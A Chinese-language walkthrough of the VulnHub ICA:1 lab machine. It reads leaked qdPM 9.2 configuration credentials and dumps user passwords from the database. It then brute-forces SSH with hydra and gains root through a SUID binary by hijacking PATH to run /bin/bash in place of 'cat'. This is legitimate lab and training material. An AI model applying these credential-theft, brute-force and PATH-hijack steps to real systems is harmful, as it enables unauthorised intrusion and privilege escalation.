[https://www.vulnhub.com/entry/ica-1,748/](https://www.vulnhub.com/entry/ica-1,748/)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201181714892.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201181717900.png)

---

`qdPM 9.2`版本存在数据泄露[https://www.exploit-db.com/exploits/50176](https://www.exploit-db.com/exploits/50176)

[http://192.168.56.102/core/config/databases.yml](http://192.168.56.102/core/config/databases.yml)

```
all:
  doctrine:
    class: sfDoctrineDatabase
    param:
      dsn: 'mysql:dbname=qdpm;host=localhost'
      profiler: false
      username: qdpmadmin
      password: "<?php echo urlencode('UcVQCMQk2STVeS6J') ; ?>"
      attributes:
        quote_identifier: true  
```

利用`qdpmadmin:UcVQCMQk2STVeS6J`成功连接数据库

在`qdpm.configuration`读到了`app_administrator_password`为`$P$EoZHz4EZ.RP1WLAVp6VUSGxVREXRAA1`想进行覆盖操作,但是不知道这玩意怎么加密的...

在`staff.user`和`staff.login`中读到了5个用户名和base64后的密码

```
Smith suRJAdGwLp8dy3rF
Lucas 7ZwV4qtg42cmUXGX
Travis X7MQkP3W29fewHdC
Dexter DJceVy98W28Y7wLg
Meyer cqNnBWCByS2DuJSy
```

试了登录qdpn全都无法登录,尝试连接ssh(看了眼wp,发现用户名是小写...)

`hydra -L ./user.txt -P ./passwd.txt 192.168.56.102 ssh`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201181749157.png)

```
travis@debian:/home/travis$ find / -user root -perm -4000 -print 2>/dev/null
/opt/get_access
/usr/bin/chfn
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/su
/usr/bin/mount
/usr/bin/chsh
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

注意`/opt/get_access`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201181759244.png)

```cpp
int __cdecl main(int argc, const char **argv, const char **envp)
{
  setuid(0);
  setgid(0);
  system("cat /root/system.info");
  if ( socket(2, 1, 0) == -1 )
    puts("Could not create socket to access to the system.");
  else
    puts("All services are disabled. Accessing to the system is allowed only within working hours.\n");
  return 0;
}
```

`cat`是相对路径下的,把环境变量中的`PATH`修改到`/tmp`目录并且在`/tmp`下新建个`cat`的`/bin/bash`就ok了

`export PATH=/tmp:$PATH`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201181804188.png)